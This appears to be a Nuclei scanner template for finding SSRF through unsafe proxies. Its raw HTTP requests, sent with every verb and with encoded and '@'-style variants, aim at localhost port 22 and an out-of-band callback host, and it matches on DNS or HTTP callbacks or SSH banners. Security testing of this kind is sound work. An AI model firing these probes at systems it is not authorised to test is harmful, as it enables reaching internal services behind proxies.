id: ssrf-via-proxy

info:
  name: SSRF via Proxy Unsafe
  author: geeknik,petergrifin
  severity: unknown
  reference:
    - https://github.com/geeknik/the-nuclei-templates/blob/main/ssrf-by-proxy.yaml
    - https://twitter.com/HusseiN98D/status/1649006265450782720
    - https://twitter.com/ImoJOnDz/status/1649089777629827072
  tags: ssrf,proxy,oast,fuzz

requests:
  - payloads:
      verb:
        - GET
        - HEAD
        - POST
        - PUT
        - DELETE
        - CONNECT
        - OPTIONS
        - TRACE
        - PATCH

    raw:
      - |+
        {{verb}} http://127.0.0.1:22 HTTP/1.1
        Host: {{Hostname}}

      - |+
        {{verb}} http://{{interactsh-url}}/#{{verb}} HTTP/1.1
        Host: {{Hostname}}

      - |+
        {{verb}} {{BaseURL}}/#{{verb}} HTTP/1.1
        Host: {{interactsh-url}}

      - |+
        {{verb}} /http://{{interactsh-url}}/#{{verb}} HTTP/1.1
        Host: {{Hostname}}

      - |+
        {{verb}} /{{BaseURL}}@{{interactsh-url}}/#{{verb}} HTTP/1.1
        Host: {{Hostname}}

      - |+
        {{verb}} http%3A%2F%2F{{interactsh-url}}%2F%23{{verb}} HTTP/1.1
        Host: {{Hostname}}

      - |+
        {{verb}} /http%3A%2F%2F{{interactsh-url}}%2F%23{{verb}} HTTP/1.1
        Host: {{Hostname}}

      - |+
        {{verb}} /{{url_encode('{{BaseURL}}@{{interactsh-url}}/#{{verb}}')}} HTTP/1.1
        Host: {{Hostname}}

    stop-at-first-match: true
    unsafe: true
    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or

      - type: word
        part: body
        words:
          - "ssh"
          - "OpenSSH"
        condition: or
